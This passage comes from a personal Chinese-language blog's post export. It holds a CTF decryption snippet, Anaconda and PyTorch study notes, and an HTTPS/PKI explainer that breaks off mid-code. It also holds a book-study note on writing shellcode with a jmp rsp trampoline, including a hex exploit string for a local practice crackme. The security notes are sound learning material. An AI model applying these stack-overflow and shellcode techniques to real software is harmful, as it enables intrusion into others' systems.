class="hljs-type">uint32_t</span> v0 = Encrypted_data[<span class="hljs-number">0</span>];<br>    <span class="hljs-type">uint32_t</span> v1 = Encrypted_data[<span class="hljs-number">1</span>];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++)<br>    &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>;i &lt; <span class="hljs-number">33</span>;i++)&#123;<br>            sum += delta;<br>            v1 -= (((<span class="hljs-number">32</span>*v0)^(v0&gt;&gt;<span class="hljs-number">4</span>)) + v0) ^ (sum + Key[(sum &gt;&gt; <span class="hljs-number">11</span>) &amp; <span class="hljs-number">3</span>]);<br>            v0 -= (((<span class="hljs-number">32</span>*v1)^(v1&gt;&gt;<span class="hljs-number">4</span>)) + v1) ^ (sum + Key[sum &amp; <span class="hljs-number">3</span>]) ^ sum;<br>        &#125;<br>    &#125;<br>Encrypted_data[<span class="hljs-number">0</span>]=v0;<br>Encrypted_data[<span class="hljs-number">1</span>]=v1;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-type">uint32_t</span> *flag = (<span class="hljs-type">uint32_t</span> *)Encrypted_data;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span> ; i++)&#123;<br>        <span class="hljs-built_in">Decrypt</span>(&amp;flag[i*<span class="hljs-number">2</span>],Key);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>,flag);<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Anaconda命令小记</title>
    <link href="/2024/01/26/Anaconda%E5%91%BD%E4%BB%A4%E5%B0%8F%E8%AE%B0/"/>
    <url>/2024/01/26/Anaconda%E5%91%BD%E4%BB%A4%E5%B0%8F%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>老是忘，浅浅记录一下</p><span id="more"></span><p><code>conda</code>配置新环境</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">conda create -n pytorch python=3.10<br>conda <span class="hljs-built_in">env</span> list<br>conda activate pytorch<br>conda install matplotlib<br></code></pre></td></tr></table></figure><p>在<code>pycharm</code>中只用<code>conda</code>环境：</p><p>在创建新的项目时，选择先前配置的解释器，然后选择自己已经配置好的<code>conda</code>环境即可。</p><p><img src="D:\Personal_Blog\hexo-blog\source_posts\Anaconda命令小记\Snipaste_2024-01-26_14-06-38.png"></p>]]></content>
    
    
    <categories>
      
      <category>工具使用</category>
      
    </categories>
    
    
    <tags>
      
      <tag>机器学习</tag>
      
      <tag>Anaconda</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>机器学习笔记1</title>
    <link href="/2024/01/26/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/"/>
    <url>/2024/01/26/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/</url>
    
    <content type="html"><![CDATA[<p>得跟上时代潮流了🐸</p><span id="more"></span><h1 id="机器学习笔记1"><a href="#机器学习笔记1" class="headerlink" title="机器学习笔记1"></a>机器学习笔记1</h1><p><a href="https://easyai.tech/">一个很好的AI基础自学网站</a></p><h3 id="监督学习-无监督学习"><a href="#监督学习-无监督学习" class="headerlink" title="监督学习&amp;无监督学习"></a>监督学习&amp;无监督学习</h3><h4 id="监督学习"><a href="#监督学习" class="headerlink" title="监督学习"></a>监督学习</h4><p><strong>监督学习需要有明确的目标，明确想要什么结果。</strong></p><p>监督并不是指人站在机器旁边看机器是否在做正确的事情，而是指以下过程：</p><ol><li>选择适合目标任务的数学模型</li><li>首先<strong>给出一些已知的“问题和答案”（训练集）</strong>给机器学习</li><li>机器总结出自己的“方法论”</li><li>人类向机器提出“新问题”（测试集）让他回答</li></ol><p>对于连续和离散两种数据，分别对于回归和分类的方法</p><h4 id="无监督学习"><a href="#无监督学习" class="headerlink" title="无监督学习"></a>无监督学习</h4><p><strong>无监督学习是机器学习训练的一种形式。它本质上是一种统计工具，可以在未标记的数据中找到潜在结构的训练方法。</strong></p><p>它主要有3个特点：</p><ol><li>无监督学习没有明确的目的</li><li>无监督学习不需要标记数据</li><li>无监督学习无法量化结果</li></ol><p>聚类：简单来说就是一种自动分类方法。在监督学习中，您确切地知道每个类别是什么，但聚类则不然。你不知道聚类后的几个类别分别代表什么意思。</p><p>降维：维度看起来很像压缩。这是为了在尽可能保留相关结构的同时降低数据的复杂性。</p><h3 id="线性回归"><a href="#线性回归" class="headerlink" title="线性回归"></a>线性回归</h3><h3 id="梯度下降"><a href="#梯度下降" class="headerlink" title="梯度下降"></a>梯度下降</h3><p><strong>梯度下降法就是一种通过求目标函数的导数来寻找目标函数最小化的方法。</strong></p><p><strong>梯度下降目的是找到目标函数最小化时的取值所对应的自变量的值，目的是为了找自变量X。</strong></p><h4 id="批量梯度下降"><a href="#批量梯度下降" class="headerlink" title="批量梯度下降"></a>批量梯度下降</h4><p>也可以说是线性回归的梯度下降，学到的第一个机器学习模型啦</p><p>对于线性回归的代价函数：其实就是求误差的平方和<br>$$<br>J(w,b)&#x3D;J((w_0,b_0);(w_1,b_1);…(w_m,b_m);)&#x3D;\frac{1}{2m}\sum_{i&#x3D;1}^{m}(f(x_i)-y_i)^2<br>$$</p><p>$$<br>f(x)&#x3D;wx+b<br>$$</p><p>梯度下降的更新过程：<br>$$<br>w_i :&#x3D;w_i-\alpha\frac{\partial}{\partial w_i}J(w,b)<br>$$</p><p>$$<br>b_i :&#x3D;b_i-\alpha\frac{\partial}{\partial b_i}J(w,b)<br>$$</p><p>其中，<code>:=</code>是赋值的意思，<code>\alpha</code>是学习率，又可以理解为每次下降的步长。这里需要注意的是，对于<code>w,b</code>是同时更新的，不能用这次新计算出的<code>w</code>去计算新的<code>b</code>。</p><p>不难发现，批量梯度下降每次都要使用所有的数据，可以保证每次都朝着正确的方向进行，但是计算量很大。</p><p><code>torch.nn.MSELoss()</code>是<code>PyTorch</code>中的一个损失函数类，用于计算均方误差（Mean Squared Error，MSE）。<code>MSE</code>是回归任务中常用的损失函数之一，用于衡量模型的预测值与真实值之间的差异。</p><p><code>MSE</code>的计算公式为:<br>$$<br>MSE &#x3D; \frac{1}{n}*\sum(Y_{pred}-Y)^2<br>$$</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><br><span class="hljs-comment"># 批量梯度下降</span><br><span class="hljs-comment"># 定义训练数据</span><br>X = torch.tensor([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">7</span>, <span class="hljs-number">10</span>, <span class="hljs-number">13</span>, <span class="hljs-number">24</span>, <span class="hljs-number">33</span>, <span class="hljs-number">44</span>, <span class="hljs-number">55</span>], dtype=torch.float32)<br>Y = torch.tensor([<span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">6</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>, <span class="hljs-number">11</span>, <span class="hljs-number">23</span>, <span class="hljs-number">32</span>, <span class="hljs-number">40</span>, <span class="hljs-number">51</span>, <span class="hljs-number">71</span>], dtype=torch.float32)<br><span class="hljs-built_in">print</span>(X)<br><br><span class="hljs-comment"># 初始化模型参数</span><br>w = torch.tensor(<span class="hljs-number">0.0</span>, requires_grad=<span class="hljs-literal">True</span>)<br>b = torch.tensor(<span class="hljs-number">0.0</span>, requires_grad=<span class="hljs-literal">True</span>)<br><br><span class="hljs-comment"># 定义代价函数</span><br>cost_func = torch.nn.MSELoss()<br><br><span class="hljs-comment"># 定义优化器和超参数</span><br>optimizer = torch.optim.SGD([w, b], lr=<span class="hljs-number">0.01</span>)<br>epochs = <span class="hljs-number">100</span><br><br><span class="hljs-comment"># 批量梯度下降</span><br><span class="hljs-keyword">for</span> epoch <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(epochs):<br>    <span class="hljs-comment"># 前向传播：使用当前的参数值对训练数据进行前向传播，</span><br>    <span class="hljs-comment"># 计算模型的预测值。对于线性回归问题，预测值可以表示为线性方程的结果，</span><br>    <span class="hljs-comment"># 即Y_pre = w * X + b</span><br>    Y_pre = w * X + b<br>    cost = cost_func(Y_pre, Y)<br><br>    cost.backward()<span class="hljs-comment"># 对应求偏导的过程</span><br>    optimizer.step()<span class="hljs-comment"># 对应更新参数的过程</span><br>    optimizer.zero_grad()<span class="hljs-comment"># 清空本次梯度</span><br>    <span class="hljs-comment"># 输出结果</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;w = <span class="hljs-subst">&#123;w.item()&#125;</span>, b = <span class="hljs-subst">&#123;b.item()&#125;</span>&quot;</span>)<br><br><span class="hljs-comment"># 绘制拟合直线</span><br>plt.scatter(X.numpy(), Y.numpy())<br>plt.plot(X.numpy(), (w * X + b).detach().numpy(), <span class="hljs-string">&#x27;r&#x27;</span>)<br>plt.show()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>读书笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>读书笔记</tag>
      
      <tag>机器学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>0Day安全软件漏洞分析第2版阅读随笔3</title>
    <link href="/2023/12/12/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%943/"/>
    <url>/2023/12/12/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%943/</url>
    
    <content type="html"><![CDATA[<h1 id="0Day安全软件漏洞分析第2版阅读随笔3"><a href="#0Day安全软件漏洞分析第2版阅读随笔3" class="headerlink" title="0Day安全软件漏洞分析第2版阅读随笔3"></a>0Day安全软件漏洞分析第2版阅读随笔3</h1><p>​开启第三章的阅读，在第二章学习了基本的栈溢出原理之后，我们已经调试过如何在缓冲区植入代码了，那么接下来将继续学习如何更专业地植入代码，或者说开发<code>shellcode</code>😋</p><span id="more"></span><h2 id="第三章-开发shellcode的艺术"><a href="#第三章-开发shellcode的艺术" class="headerlink" title="第三章-开发shellcode的艺术"></a>第三章-开发shellcode的艺术</h2><p>​<code>shellcode</code>这个专用术语来通称缓冲区溢出攻击中植入进程的代码。这 段代码可以是出于恶作剧目的的弹出一个消息框，也可以是出于攻击目的的删改重要文件、窃取 数据、上传木马病毒并运行，甚至是出于破坏目的的格式化硬盘等。请注意本章讨论的<code>shellcode</code>是这种广义上的植入进程的代码，而不是狭义上的仅仅用来获得 <code>shell</code>的代码。</p><p>​我们还会经常看到另一个术语——<code>exploit</code>。 植入代码之前需要做大量的调试工作，例如，弄清楚程序有几个输入点，这些输入将最终 会当作哪个函数的第几个参数读入到内存的哪一个区域，哪一个输入会造成栈溢出，在复制到栈区的时候对这些数据有没有额外的限制等。调试之后还要计算函数返回地址距离缓冲区的偏 移并淹没之，选择指令的地址，最终制作出一个有攻击效果的“承载”着<code>shellcode</code>的输入字符 串。这个代码植入的过程就是漏洞利用，也就是<code>exploit</code>。<code>exploit</code>一般以一段代码的形式出现，用于生成攻击性的网络数据包或者其他形式的攻击性 输入。<code>expliot</code>的核心是淹没返回地址，劫持进程的控制权，之后跳转去执行<code>shellcode</code>。与<code>shellcode</code>具有一定的通用性不同，<code>exploit</code>往往是针对特定漏洞而言的。</p><p>比如我们在第二章里写的代码：</p><p><img src="/2023/12/12/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%943/Snipaste_2023-12-12_18-40-46.png"></p><h3 id="开发shellcode需要解决的问题"><a href="#开发shellcode需要解决的问题" class="headerlink" title="开发shellcode需要解决的问题"></a>开发shellcode需要解决的问题</h3><p>​通过上面的介绍，你应该已经明白了什么是<code>shellcode</code>，正是我们在第二章植入的那段机器码。在第二章的植入代码部分，我们是通过手动查找得到函数调用的地址以及函数返回地址，这显然不是通用的。加之，当存在缺陷的函数处于<code>ddl</code>中，并且被程序动态装载，地址每次都存在变化，这时就需要我们找到一种方式，使得能够自动定位到<code>shellcode</code>的地址。</p><h3 id="定位shellcode"><a href="#定位shellcode" class="headerlink" title="定位shellcode"></a>定位shellcode</h3><h4 id="栈帧移位与jmp-esp"><a href="#栈帧移位与jmp-esp" class="headerlink" title="栈帧移位与jmp esp"></a>栈帧移位与jmp esp</h4><p>关于栈帧移位，笔者在这里不太了解实际的过程，暂且记下，现在只关注如何动态定位。</p><p><img src="/2023/12/12/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%943/Snipaste_2023-12-12_16-27-19.png"></p><p>​通过前两章的调试，我们其实已经很清楚指令执行和栈变化的过程，可以发现的是，每次函数调用完成之前，都会将之前减去的栈偏移加回来，所以我们可以发现，此时<code>esp</code>(64位下<code>rsp</code>)寄存器的内容正好在我们的返回地址的下一个位置，注意这里指的是栈上返回地址对应的地方，<code>esp</code>是栈帧指针。</p><p>​所以动态定位不就可以实现了，我们在系统找到一个<code>jmp rsp</code>指令的地址，然后在返回地址处填上这个地址，那么之后就会执行这个指令跳转到当前<code>rsp</code>存放的地址，也就是栈上淹没返回地址处后一个位置<code>shellcode</code>就在这之后执行。</p><p>所以重新的规划大概如下图：</p><p><img src="/2023/12/12/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%943/Snipaste_2023-12-12_18-37-55.png"></p><h4 id="x64dbg如何搜索跳板指令位置"><a href="#x64dbg如何搜索跳板指令位置" class="headerlink" title="x64dbg如何搜索跳板指令位置"></a>x64dbg如何搜索跳板指令位置</h4><p>笔者之前已经提到，我是在64位机器上进行的操作，所以只能采用x64dbg，没有使用书里的OD，暂时没有找到什么好用的插件可以之间定位到我们需要的<code>dll</code>库中的跳板位置，所以这里我采用原始的搜索方式。</p><p>直接右键搜索命令：<code>jmp rsp</code></p><p><img src="/2023/12/12/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%943/Snipaste_2023-12-12_18-58-55.png"></p><p><img src="/2023/12/12/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%943/Snipaste_2023-12-12_18-59-11.png"></p><p>这里我就直接采用了第一个地址<code>00007FFC81014A53</code>，在内存布局中找到，确认是系统模块</p><p><img src="/2023/12/12/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%943/Snipaste_2023-12-12_19-02-55.png"></p><h4 id="crack-me5"><a href="#crack-me5" class="headerlink" title="crack_me5"></a>crack_me5</h4><p>程序和crack_me4是一样的，只是我们要改变我们的劫持流程。</p><p>首先我们已经获取到了跳板地址，在上面，由于是系统模块，所以一般还是不会变的。然后找到<code>MessageBoxA</code>函数的地址，采用读书笔记2的方法。</p><p>可以发现这次的地址改变了，说明确实是动态加载的，所以这里应该有个疑问<code>MessageBoxA</code>的地址怎么动态获取，笔者在这里还不知道具体的解决方案。查到是<code>00007FFC8361A000</code>，查到ExitProcess函数的地址为<code>00007FFC82DEE3B0</code></p><p>下面制作我们所说的<code>exploit</code>：在之前的基础上加入了退出调用</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">3132333435363738313233343536373831323334353637383132333435363738313233343536373831323334353637383132333435363738534</span>A0181FC7F11114883EC4833DB5348B82165723068737833508BC45350505348B8A06183FC7F11111148C1E01848C1E810FFD04883C44848B8B0E3DE82FC7F111148C1E01048C1E810FFD<span class="hljs-number">04883C448</span><br></code></pre></td></tr></table></figure><p><img src="/2023/12/12/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%943/Snipaste_2023-12-12_21-56-12.png"></p><p>然后进行调试过程：</p><p>我们在<code>strcpy</code>函数调用之后那个地方打断点，直接运行到那个地方，这里因为防止截断，我将64位中的0换为了1，然后在此时修改栈上的数据，目前没有找到更好的解决办法</p><p><img src="/2023/12/12/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%943/Snipaste_2023-12-12_21-46-58.png"></p><p>已经跳转到了我们的跳板地址</p><p><img src="/2023/12/12/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%943/Snipaste_2023-12-12_21-50-02.png"></p><p>这里参考读书笔记2，修改一下在栈上的执行权限，继续步进</p><p>可以发现已经如我们分析的那样，跳转回到了我们布置好的<code>shellcode</code>处</p><p><img src="/2023/12/12/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%943/Snipaste_2023-12-12_21-52-35.png"></p><p>正常跳转到弹窗函数：</p><p><img src="/2023/12/12/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%943/Snipaste_2023-12-12_21-57-18.png"></p><p>可以发现已经跳到退出函数的地方</p><p><img src="/2023/12/12/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%943/Snipaste_2023-12-12_22-03-42.png"></p><p>然后就可以正常退出了，虽然不知道为何不能弹窗。唉</p>]]></content>
    
    
    <categories>
      
      <category>读书笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>读书笔记</tag>
      
      <tag>软件与系统安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTTPS中的数字认证原理</title>
    <link href="/2023/12/09/HTTPS%E4%B8%AD%E7%9A%84%E6%95%B0%E5%AD%97%E8%AE%A4%E8%AF%81%E5%8E%9F%E7%90%86/"/>
    <url>/2023/12/09/HTTPS%E4%B8%AD%E7%9A%84%E6%95%B0%E5%AD%97%E8%AE%A4%E8%AF%81%E5%8E%9F%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h2 id="HTTPS中的数字认证原理"><a href="#HTTPS中的数字认证原理" class="headerlink" title="HTTPS中的数字认证原理"></a>HTTPS中的数字认证原理</h2><p>笔者在近期学习了数字认证技术相关的东西，对其中公钥基础设施PKI进行较为深入的挖掘，于是写下此篇博客。🙈</p><span id="more"></span><h3 id="https与http"><a href="#https与http" class="headerlink" title="https与http"></a>https与http</h3><p>在开始CA相关的东西时，我们首先应该了解https和http。</p><p>HTTP（Hypertext Transfer Protocol）和HTTPS（HTTP Secure）是两种常见的用于在客户端和服务器之间传输数据的协议。<strong>从网络协议的底层来说，两者并无区别，但是https实现了更加安全的传输过程。</strong></p><p>具体有下面的区别：</p><ol><li>默认端口：http是80，https是443</li><li>传输内容：http是明文传输，https是加密传输</li><li>建立连接方式：http是直接连接，https需要SSL&#x2F;TLS握手过程</li></ol><h3 id="数字认证原理"><a href="#数字认证原理" class="headerlink" title="数字认证原理"></a>数字认证原理</h3><h4 id="公钥基础设施PKI"><a href="#公钥基础设施PKI" class="headerlink" title="公钥基础设施PKI"></a>公钥基础设施PKI</h4><p>举一个简单的例子，一个用户在浏览器里访问网站时，如何才能判别访问的网站是安全可信的呢？</p><p>此时只有引入绝对公正的第三方（一般为政府）作为证明者，证明所访问的网站是可信的，这就是公钥基础设施的由来。</p><p>我们已经知道，https在为客户端和服务端建立连接之前需要进行SSL&#x2F;TLS握手过程，那么这个过程的实现基础就是PKI。</p><p>那么PKI中，用什么作为信任根或者说信任凭证呢，就是我们常说的证书啦😀</p><p><strong>数字证书是最常见的证书类型，它包含了公钥、实体的身份信息以及证书颁发机构的签名。理所当然的，证书使用的是非对称密码体制。正常情况下，系统会安装CA的根证书用于验证其签发的证书</strong></p><p>目前的浏览器会对用户进行提醒，如果网站的证书过期，会提示有风险。</p><p><img src="/2023/12/09/HTTPS%E4%B8%AD%E7%9A%84%E6%95%B0%E5%AD%97%E8%AE%A4%E8%AF%81%E5%8E%9F%E7%90%86/Snipaste_2023-12-08_20-35-07.png"></p><h4 id="证书颁发机构CA-注册机构RA"><a href="#证书颁发机构CA-注册机构RA" class="headerlink" title="证书颁发机构CA&amp;&amp;注册机构RA"></a>证书颁发机构CA&amp;&amp;注册机构RA</h4><p>RA是注册机构（Registration Authority）的缩写。</p><p>在公钥基础设施（PKI）中，注册机构是与证书颁发机构（CA）合作的实体，负责收集、审核和验证实体的身份信息，并向CA提供这些信息以用于数字证书的签发。注册机构在PKI中发挥重要的角色，它们与CA一起确保数字证书的可信性和准确性。注册机构负责收集申请者的身份信息，可能包括个人身份证明、组织文件、域名所有权验证等。注册机构会对这些信息进行审核和验证，确保其真实性和合法性。</p><p>CA是证书颁发机构（Certificate Authority）的缩写。</p><p>证书颁发机构是一个受信任的实体，负责签发和管理数字证书，以验证实体的身份和信息的真实性。在公钥基础设施（PKI）中，<strong>CA是PKI体系结构的核心组成部分之一</strong>。它们使用自己的私钥对数字证书进行签名，并为实体（如网站、个人或设备）颁发包含公钥和身份信息的数字证书。</p><p>CA的主要职责包括：</p><ol><li>身份验证：CA会对申请数字证书的实体进行身份验证，以确保其合法性和真实性。这可以包括验证个人的身份证明、组织的注册文件、域名所有权等，当然也可以通过RA进行代理。</li><li>签发证书：一旦CA验证了申请者的身份信息，它会<strong>使用自己的私钥和根证书对数字证书进行签名</strong>，并将证书发送给申请者。该证书包含了实体的公钥、身份信息以及CA的签名。</li><li>证书管理：CA负责管理已签发的数字证书。这包括证书的更新、吊销和过期处理等操作。CA还维护一个公共的证书撤销列表（CRL），其中包含已吊销的证书的信息。</li><li>可信性建立：由于CA是受信任的实体，其签名可以用于验证数字证书的真实性和完整性。其他实体可以通过验证证书的签名和查看CA的信任列表来确认证书的有效性。</li></ol><h3 id="证书的颁发-验证"><a href="#证书的颁发-验证" class="headerlink" title="证书的颁发&amp;验证"></a>证书的颁发&amp;验证</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>从上文已经知道，证书的颁发和验证是通过CA来完成的，那么下面具体讲一讲实现过程。</p><p>一般来说，在单向认证过程中只需要用户验证服务端证书，只有服务端需要请求CA颁发证书。那么服务端，具体来讲就是一个网站，需要向CA申请一个证书，首先发送证书签发请求，然后通过CA的身份验证合法性后，继续向CA发送一个证书请求文件CSR，CA在接收到证书请求文件后，会使用根证书和私钥对其进行签名，然后就会生成一个证书文件CRT，返回给服务端。</p><p>大概过程如下：</p><p><img src="/2023/12/09/HTTPS%E4%B8%AD%E7%9A%84%E6%95%B0%E5%AD%97%E8%AE%A4%E8%AF%81%E5%8E%9F%E7%90%86/CA%E9%A2%81%E5%8F%91%E8%BF%87%E7%A8%8B.png"></p><p>证书的验证是通过系统安装的CA机构的根证书来验证的。</p><p>那么双向认证是基于单向认证的，很好理解，笔者将双向认证的过程也画了一张图😋：</p><p><img src="/2023/12/09/HTTPS%E4%B8%AD%E7%9A%84%E6%95%B0%E5%AD%97%E8%AE%A4%E8%AF%81%E5%8E%9F%E7%90%86/%E5%8F%8C%E5%90%91%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B.png"></p><h4 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h4><p>笔者知道，上面的文字叙述过于繁琐，那么下面笔者上代码，这是笔者用Python和OpenSSL库开发的一个的基于双向认证的CA签发模拟程序。</p><p>大概有如下效果：</p><p><img src="/2023/12/09/HTTPS%E4%B8%AD%E7%9A%84%E6%95%B0%E5%AD%97%E8%AE%A4%E8%AF%81%E5%8E%9F%E7%90%86/Snipaste_2023-12-08_21-11-34.png"></p><p><img src="/2023/12/09/HTTPS%E4%B8%AD%E7%9A%84%E6%95%B0%E5%AD%97%E8%AE%A4%E8%AF%81%E5%8E%9F%E7%90%86/Snipaste_2023-12-08_21-12-47.png"></p><p><img src="/2023/12/09/HTTPS%E4%B8%AD%E7%9A%84%E6%95%B0%E5%AD%97%E8%AE%A4%E8%AF%81%E5%8E%9F%E7%90%86/Snipaste_2023-12-08_21-12-57.png"></p><p><img src="/2023/12/09/HTTPS%E4%B8%AD%E7%9A%84%E6%95%B0%E5%AD%97%E8%AE%A4%E8%AF%81%E5%8E%9F%E7%90%86/Snipaste_2023-12-08_21-13-27.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span 